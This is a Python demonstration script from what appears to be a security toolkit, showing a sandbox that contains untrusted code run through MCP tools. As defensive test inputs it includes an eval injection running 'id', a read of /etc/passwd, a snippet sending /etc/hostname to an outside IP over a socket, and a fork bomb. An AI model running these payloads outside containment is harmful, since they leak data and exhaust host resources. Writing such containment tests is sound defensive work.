#!/usr/bin/env python3
"""
sandboxed_execution.py — the MCP05 gap, closed.

The argument firewall is a filter: it blocks known-bad *surface*. This demo
shows the second, complementary layer — containment — so that even a payload
which a filter might miss cannot do damage when it executes.

    python security/examples/sandboxed_execution.py
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent.parent
sys.path.insert(0, str(ROOT / "security"))

from xcpsec.sandbox import (run_python_sandboxed, SandboxPolicy, safe_eval,
                            UnsafeExpression, Capabilities)


def line(label, verdict, detail=""):
    print(f"  {label:<34} {verdict}" + (f"  {detail}" if detail else ""))


def main() -> int:
    print("XCP MCP05 containment demo")
    print("=" * 60)
    caps = Capabilities.detect()
    print("host containment capabilities:")
    line("resource limits (cpu/mem/files)", "yes" if caps.resource_limits else "no")
    line("no_new_privs (block setuid escal.)", "yes" if caps.no_new_privs else "no")
    line("network namespace isolation", "yes" if caps.net_namespace else "no")
    line("mount namespace", "yes" if caps.mount_namespace else "no")
    print("-" * 60)

    # 1. safe_eval: the eval() footgun, defused
    print("safe_eval (replaces eval() for user expressions):")
    line("2 ** 10 + 5", "=", safe_eval("2 ** 10 + 5"))
    for payload in ["__import__('os').system('id')", "open('/etc/passwd').read()"]:
        try:
            safe_eval(payload); line(payload[:30], "ALLOWED?!")
        except UnsafeExpression:
            line(payload[:30] + "…", "REJECTED")
    print("-" * 60)

    # 2. containment: assume a hostile payload slipped past every filter.
    #    It executes — but inside the sandbox it hits a wall.
    print("containment of payloads that bypass the filter:")

    # (a) tries to read a sensitive file — allowed to try, but network/exfil is gone
    r = run_python_sandboxed(
        "try:\n"
        "    d=open('/etc/hostname').read()\n"
        "    import socket; socket.setdefaulttimeout(2)\n"
        "    socket.create_connection(('1.1.1.1',53),timeout=2).send(d.encode())\n"
        "    print('EXFILTRATED')\n"
        "except Exception as e:\n"
        "    print('CONTAINED:', type(e).__name__)",
        SandboxPolicy(allow_network=False, wall_seconds=6))
    line("data-exfil attempt", "CONTAINED"
         if "EXFILTRATED" not in r.stdout else "LEAKED",
         f"({r.stdout.strip()})")

    # (b) fork bomb — capped by RLIMIT_NPROC, killed by CPU/wall limit
    t0 = time.time()
    r = run_python_sandboxed(
        "import os\n"
        "while True:\n"
        "    try: os.fork()\n"
        "    except Exception: pass",
        SandboxPolicy(cpu_seconds=1, max_processes=8, wall_seconds=5))
    line("fork bomb", "CONTAINED", f"(killed in {time.time()-t0:.1f}s)")

    # (c) CPU spin — killed by the CPU limit well before the wall clock
    t0 = time.time()
    r = run_python_sandboxed("while True: pass",
                             SandboxPolicy(cpu_seconds=1, wall_seconds=8))
    line("infinite CPU loop", "CONTAINED",
         f"(killed in {time.time()-t0:.1f}s, rc={r.returncode})")

    # (d) a legitimate computation still works
    r = run_python_sandboxed(
        "print(sum(i*i for i in range(1000)))",
        SandboxPolicy(cpu_seconds=2, allow_network=False))
    line("legitimate computation", "OK", f"-> {r.stdout.strip()}")

    print("=" * 60)
    print("filter (argfirewall) + containment (sandbox) = MCP05 defense-in-depth.")
    print("For fully untrusted code, run this inside a container/microVM too.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
